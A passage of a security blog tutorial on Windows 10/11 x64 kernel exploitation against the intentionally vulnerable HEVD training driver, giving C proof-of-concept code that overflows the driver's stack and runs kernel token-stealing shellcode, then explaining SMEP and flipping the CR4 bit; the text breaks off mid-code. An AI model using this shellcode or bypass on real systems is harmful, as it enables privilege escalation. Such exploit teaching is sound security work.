<!doctype html>
<html lang="en-us">
  <head>
    <title>0x01 - Killing Windows Kernel Mitigations // </title>
    <link rel="shortcut icon" href="/favicon.ico" />
    <meta charset="utf-8" />
    <meta name="generator" content="Hugo 0.131.0">
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="author" content="John Doe" />
    <meta name="description" content="" />
    <link rel="stylesheet" href="/css/main.min.5b1fcc8902588589c4767187402a3c29f8b8d7a6fdef6d9f8f77045bb0d14fee.css" />
    

    
  


    
  <meta name="twitter:card" content="summary">
  <meta name="twitter:title" content="0x01 - Killing Windows Kernel Mitigations">
  <meta name="twitter:description" content="This post was made possible through hard work and determination. Do not feel frustrated if this stuff does not click immediately and remember, the source of truth will always be the source code. For us, our source code is raw assembly. That said it’s important you understand these techniques in detail because when Microsoft releases new mitigations your foundation is what will allow you to develop bypasses. So, if something is not clear take your time and step through it in the debugger.">

    <meta property="og:url" content="https://wetw0rk.github.io/posts/0x01-killing-windows-kernel-mitigations/">
  <meta property="og:site_name" content="wetw0rk">
  <meta property="og:title" content="0x01 - Killing Windows Kernel Mitigations">
  <meta property="og:description" content="This post was made possible through hard work and determination. Do not feel frustrated if this stuff does not click immediately and remember, the source of truth will always be the source code. For us, our source code is raw assembly. That said it’s important you understand these techniques in detail because when Microsoft releases new mitigations your foundation is what will allow you to develop bypasses. So, if something is not clear take your time and step through it in the debugger.">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2024-12-07T00:00:00+00:00">
    <meta property="article:modified_time" content="2024-12-07T00:00:00+00:00">


  </head>
  <body>
    <header class="app-header">
      <a href="https://wetw0rk.github.io/"><img class="app-header-avatar" src="/me.png" alt="John Doe" /></a>
      <span class="app-header-title"></span>
      <p> </p>
      <div class="app-header-social">
        
          <a href="https://github.com/wetw0rk" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-github" viewBox="0 0 24 24" fill="currentColor"><title>GitHub</title><path d="M12 .297c-6.63 0-12 5.373-12 12 0 5.303 3.438 9.8 8.205 11.385.6.113.82-.258.82-.577 0-.285-.01-1.04-.015-2.04-3.338.724-4.042-1.61-4.042-1.61C4.422 18.07 3.633 17.7 3.633 17.7c-1.087-.744.084-.729.084-.729 1.205.084 1.838 1.236 1.838 1.236 1.07 1.835 2.809 1.305 3.495.998.108-.776.417-1.305.76-1.605-2.665-.3-5.466-1.332-5.466-5.93 0-1.31.465-2.38 1.235-3.22-.135-.303-.54-1.523.105-3.176 0 0 1.005-.322 3.3 1.23.96-.267 1.98-.399 3-.405 1.02.006 2.04.138 3 .405 2.28-1.552 3.285-1.23 3.285-1.23.645 1.653.24 2.873.12 3.176.765.84 1.23 1.91 1.23 3.22 0 4.61-2.805 5.625-5.475 5.92.42.36.81 1.096.81 2.22 0 1.606-.015 2.896-.015 3.286 0 .315.21.69.825.57C20.565 22.092 24 17.592 24 12.297c0-6.627-5.373-12-12-12"/></svg>
          </a>
        
          <a href="https://twitter.com/wetw0rk_bot" target="_blank" rel="noreferrer noopener me">
            <svg class="icon icon-brand-x" viewBox="0 0 24 24" fill="currentColor"><title>X</title><path d="M18.901 1.153h3.68l-8.04 9.19L24 22.846h-7.406l-5.8-7.584-6.638 7.584H.474l8.6-9.83L0 1.154h7.594l5.243 6.932ZM17.61 20.644h2.039L6.486 3.24H4.298Z"/></svg>
          </a>
        
      </div>
    </header>
    <main class="app-container">
      
  <article class="post">
    <header class="post-header">
      <h1 class ="post-title">0x01 - Killing Windows Kernel Mitigations</h1>
      <div class="post-meta">
        <div>
          <svg class="icon icon-calendar" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>calendar</title><rect x="3" y="4" width="18" height="18" rx="2" ry="2"></rect><line x1="16" y1="2" x2="16" y2="6"></line><line x1="8" y1="2" x2="8" y2="6"></line><line x1="3" y1="10" x2="21" y2="10"></line></svg>
          Dec 7, 2024
        </div>
        <div>
          <svg class="icon icon-clock" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><title>clock</title><circle cx="12" cy="12" r="10"></circle><polyline points="12 6 12 12 16 14"></polyline></svg>
          18 min read
        </div>
      </div>
    </header>
    <div class="post-content">
      <p>This post was made possible through hard work and determination. Do not feel frustrated if this stuff does not click immediately and remember, the source of truth will always be the source code. For us, our source code is raw assembly. That said it’s important you understand these techniques in detail because when Microsoft releases new mitigations your foundation is what will allow you to develop bypasses. So, if something is not clear take your time and step through it in the debugger.</p>
<p>In the <a href="https://wetw0rk.github.io/posts/0x00-introduction-to-windows-kernel-exploitation/">last post</a> you should have obtained a solid understanding of the basics of Windows Kernel Exploitation. We will now be jumping off the deep end and exploiting Windows 10 (x64) and Windows 11 (x64). Within this post you will be getting an introduction to some of the latest exploit mitigations offered by Microsoft and how &ldquo;easily&rdquo; they can be bypassed. That said only SOME will be covered, more exist but we will only cover them when relevant within this series.</p>
<p>In addition, this post will include the release of my PoC ROP chain - <em>Violet Phosphorus</em>, a universal VBS/SMEP bypass technique.</p>
<p>To prove its effectiveness, I went ahead deployed <em>Violet Phosphorus</em> against Windows 11 24H2 just for this post. If I understand correctly this is the latest version of Windows 11 which was released October 1st, 2024.</p>
<pre tabindex="0"><code>DISCLAIMER: TO BE CLEAR THIS DOES NOT BYPASS HVCI, AT THE TIME OF WRITING I BELIEVED THIS TO BYPASS HVCI. THIS POST ONLY CONTAINS A SMEP BYPASS. ADDITIONALLY EXPLOITS IN THIS SERIES WERE TESTED PRIMARILY ON: WINDOWS 11 (x64) - 10.0.22000 N/A Build 22000
</code></pre><h1 id="table-of-contents">Table of Contents</h1>
<ul>
<li><a href="#entering-the-modern-landscape">Entering the Modern Landscape</a>
<ul>
<li><a href="#bypassing-smep-theory">Bypassing SMEP (Theory)</a>
<ul>
<li><a href="#finding--using-rop-gadgets">Finding &amp; Using ROP Gadgets</a></li>
<li><a href="#finding-the-kernel-base-address">Finding the Kernel Base Address</a></li>
</ul>
</li>
<li><a href="#bypassing-vbs-theory">Bypassing VBS (Theory)</a></li>
</ul>
</li>
<li><a href="#violet-phosphorus">Violet Phosphorus</a>
<ul>
<li><a href="#understanding-the-rop-chain">Understanding the ROP Chain</a></li>
</ul>
</li>
<li><a href="#crafting-a-poc">Crafting a PoC</a></li>
<li><a href="#exploitation-rip--tear">Exploitation (Rip &amp; Tear)</a></li>
<li><a href="#sources">Sources</a></li>
</ul>
<h1 id="entering-the-modern-landscape">Entering the Modern Landscape</h1>
<p>Considering we exploited the Stack Overflow within <code>Windows 7 (x86)</code> and having gone in depth in regards to it&rsquo;s underlying operations. There was no need to re-hash the vulnerability, at least not for this type of bug. That said, we can go ahead and jump straight into exploit development for Windows 10 (x64).</p>
<p>As mentioned in the <a href="https://wetw0rk.github.io/posts/0x00-introduction-to-windows-kernel-exploitation/">last post</a> we will shift languages and use C rather than Python. If you&rsquo;re using Kali and want to follow along with me, install <em>mingw-w64</em> as this will be what I will be using to compile my exploit code. You can also use <a href="https://visualstudio.microsoft.com/">Visual Studio</a> it&rsquo;s all based on preference really.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sudo apt install mingw-w64 -y
</span></span></code></pre></div><p>If you&rsquo;re still new to C, the following can also be accomplished in Python. I intentionally used it in the last post for those who want to jump in without using C. However, you will see that the further you get into exploit development knowledge of C is not optional. That said let&rsquo;s look at our initial PoC code:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER_SIZE 4242
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    HANDLE hHEVD                <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    DWORD bytesReturned         <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buffer[BUFFER_SIZE]    <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Getting a handle on HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                        (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                        NULL,
</span></span><span style="display:flex;"><span>                        OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                        FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                        NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Generating evil buffer...&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memset</span>(buffer, <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">3000</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering control code 0x222003</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x222003</span>,
</span></span><span style="display:flex;"><span>                    buffer,
</span></span><span style="display:flex;"><span>                    BUFFER_SIZE,
</span></span><span style="display:flex;"><span>                    NULL,
</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>bytesReturned,
</span></span><span style="display:flex;"><span>                    NULL);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>We can compile it using a cross compiler from mingw from within Linux (<em>x86_64-w64-mingw32-gcc poc.c -o poc.exe</em>). Once sent, we can see that we have successfully achieved memory corruption :)</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/corruption.png" alt="alt text"></p>
<p>Let&rsquo;s update the PoC this time we&rsquo;ll include shellcode (Generated with <a href="https://github.com/wetw0rk/Sickle">Sickle</a>).</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;windows.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define BUFFER_SIZE 4242
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>()
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>    HANDLE hHEVD <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    LPVOID lpMemory <span style="color:#f92672">=</span> NULL;
</span></span><span style="display:flex;"><span>    DWORD bytesReturned <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> shellcodeLength <span style="color:#f92672">=</span> <span style="color:#ae81ff">62</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int64_t</span> buffer[BUFFER_SIZE] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> shellcode[] <span style="color:#f92672">=</span>
</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// python3 sickle.py -p windows/x64/kernel_token_stealer -f c -m pinpoint
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x65\x48\xa1\x88\x01\x00\x00\x00\x00\x00\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#75715e">// movabs rax, qword ptr gs:[0x188]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\xb8\x00\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0xb8]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\xc1</span><span style="color:#e6db74">&#34;</span>                                 <span style="color:#75715e">// mov rcx, rax
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb2\x04</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// mov dl, 4
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x80\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rax, qword ptr [rax + 0x448]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x2d\x48\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// sub rax, 0x448
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x38\x90\x40\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                     <span style="color:#75715e">// cmp byte ptr [rax + 0x440], dl
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xeb</span><span style="color:#e6db74">&#34;</span>                                     <span style="color:#75715e">// jne 0x1017
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x8b\x90\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov rdx, qword ptr [rax + 0x4b8]
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x48\x89\x91\xb8\x04\x00\x00</span><span style="color:#e6db74">&#34;</span>                 <span style="color:#75715e">// mov qword ptr [rcx + 0x4b8], rdx
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5d</span><span style="color:#e6db74">&#34;</span>          <span style="color:#75715e">// pop rbp
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc2\x08\x00</span><span style="color:#e6db74">&#34;</span>; <span style="color:#75715e">// ret 8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Getting a handle on HEVD</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    hHEVD <span style="color:#f92672">=</span> <span style="color:#a6e22e">CreateFileA</span>(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\\\</span><span style="color:#e6db74">.</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">HackSysExtremeVulnerableDriver&#34;</span>,
</span></span><span style="display:flex;"><span>                        (GENERIC_READ <span style="color:#f92672">|</span> GENERIC_WRITE),
</span></span><span style="display:flex;"><span>                        <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                        NULL,
</span></span><span style="display:flex;"><span>                        OPEN_EXISTING,
</span></span><span style="display:flex;"><span>                        FILE_ATTRIBUTE_NORMAL,
</span></span><span style="display:flex;"><span>                        NULL);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (hHEVD <span style="color:#f92672">==</span> INVALID_HANDLE_VALUE)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to get a handle on HackSysExtremeVulnerableDriver</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Allocating RWX memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    lpMemory <span style="color:#f92672">=</span> <span style="color:#a6e22e">VirtualAlloc</span>(NULL,
</span></span><span style="display:flex;"><span>                            shellcodeLength,
</span></span><span style="display:flex;"><span>                            (MEM_COMMIT <span style="color:#f92672">|</span> MEM_RESERVE),
</span></span><span style="display:flex;"><span>                            PAGE_EXECUTE_READWRITE);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Copying shellcode into RWX memory</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">memcpy</span>(lpMemory, shellcode, shellcodeLength);
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Spraying return address: 0x%p</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, lpMemory);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> (i <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>; i <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">270</span>; i<span style="color:#f92672">++</span>)
</span></span><span style="display:flex;"><span>    {
</span></span><span style="display:flex;"><span>        <span style="color:#75715e">/* Spray the return address, who cares about accuracy ;) */</span>
</span></span><span style="display:flex;"><span>        buffer[i] <span style="color:#f92672">=</span> (<span style="color:#66d9ef">int64_t</span>)lpMemory;
</span></span><span style="display:flex;"><span>    }
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[*] Triggering control code 0x222003</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">DeviceIoControl</span>(hHEVD,
</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x222003</span>,
</span></span><span style="display:flex;"><span>                    buffer,
</span></span><span style="display:flex;"><span>                    BUFFER_SIZE,
</span></span><span style="display:flex;"><span>                    NULL,
</span></span><span style="display:flex;"><span>                    <span style="color:#ae81ff">0x00</span>,
</span></span><span style="display:flex;"><span>                    <span style="color:#f92672">&amp;</span>bytesReturned,
</span></span><span style="display:flex;"><span>                    NULL);
</span></span><span style="display:flex;"><span>}
</span></span></code></pre></div><p>Let&rsquo;s try to allocate memory as we did before in <code>Windows 7 (x86)</code>. When we jump to it we get the following error:</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/attempt_failed_exec_userland_code.png" alt="alt text"></p>
<p>After a bit of research on the error we can confirm we’re dealing with <strong>SMEP (Supervisor Mode Execution Prevention)</strong> which is a memory protection built into modern Windows OS’s since Windows 8. Assuming you’re familiar with userland exploitation imagine this as DEP only the focus is preventing code execution within user-mode memory. This is oversimplifying it but for the sake of this tutorial we won’t dive any deeper. All we need to do is find a way to bypass it, that is our objective.</p>
<h2 id="bypassing-smep-theory">Bypassing SMEP (Theory)</h2>
<p>To bypass SMEP we’re likely going to need to deploy some ROP, just as we would if we encountered DEP in a user-mode context. If you’re familiar with Linux Kernel exploitation your brain might also go to SMAP. This is good since we’ll be dealing with bits. In short, SMEP is enabled by setting the 20th bit of the CR4 register. In theory, this can be modified by the Kernel, hence why ROP is an ideal technique to deploy.</p>
<p>Let&rsquo;s look at this in WinDbg.</p>
<p><img src="/0x01-Killing-Windows-Kernel-Mitigations/cr4.png" alt="alt text"></p>
<p>When flipping the bits of any number, we are in essence changing the value. To see what number we&rsquo;d need to place here be representative of flipping the 20th bit I wrote a simple C program to generate the number for me. The code to do this, can be seen below:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">/* wetw0rk */</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdint.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">// https://stackoverflow.com/questions/111928/is-there-a-printf-converter-to-print-in-binary-format
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#75715e">#define PRINTF_BINARY_PATTERN_INT8 &#34;%c%c%c%c%c%c%c%c &#34;
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BYTE_TO_BINARY_INT8(i)    \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x80ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x40ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x20ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x10ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x08ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x04ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x02ll) ? &#39;1&#39; : &#39;0&#39;), \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    (((i) &amp; 0x01ll) ? &#39;1&#39; : &#39;0&#39;)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BINARY_PATTERN_INT16 \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BINARY_PATTERN_INT8              PRINTF_BINARY_PATTERN_INT8
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BYTE_TO_BINARY_INT16(i) \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BYTE_TO_BINARY_INT8((i) &gt;&gt; 8),   PRINTF_BYTE_TO_BINARY_INT8(i)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BINARY_PATTERN_INT32 \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BINARY_PATTERN_INT16             PRINTF_BINARY_PATTERN_INT16
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BYTE_TO_BINARY_INT32(i) \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BYTE_TO_BINARY_INT16((i) &gt;&gt; 16), PRINTF_BYTE_TO_BINARY_INT16(i)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BINARY_PATTERN_INT64    \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BINARY_PATTERN_INT32             PRINTF_BINARY_PATTERN_INT32
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#define PRINTF_BYTE_TO_BINARY_INT64(i) \
</span></span></span><span style="display:flex;"><span><span style="color:#75715e">    PRINTF_BYTE_TO_BINARY_INT32((i) &gt;&gt; 32), PRINTF_BYTE_TO_BINARY_INT32(i)
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">/*
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> * flip_bit: simple function to flip a bit, for CR4 this would be 20
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"> */</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">uint64_t</span> <span style="color:#a6e22e">flip_bit</span>(<span style="color:#66d9ef">uint64_t</span> cr4, <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> bit_position)
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">unsigned</span> <span style="color:#66d9ef">int</span> mask <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span> <span style="color:#f92672">&lt;&lt;</span> (bit_position <span style="color:#f92672">-</span> <span style="color:#ae81ff">1</span>);
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">return</span> (cr4 <span style="color:#f92672">^</span> mask);
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>argv[])
</span></span><span style="display:flex;"><span>{
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">uint64_t</span> num <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>  <span style="color:#66d9ef">if</span> (argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>) {
</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;Usage: %s &lt;current cr4 value&gt;</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, argv[<span style="color:#ae81ff">0</span>]);
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
</span></span><span style="display:flex;"><span>  }
</span></span><span style="display:flex;"><span>
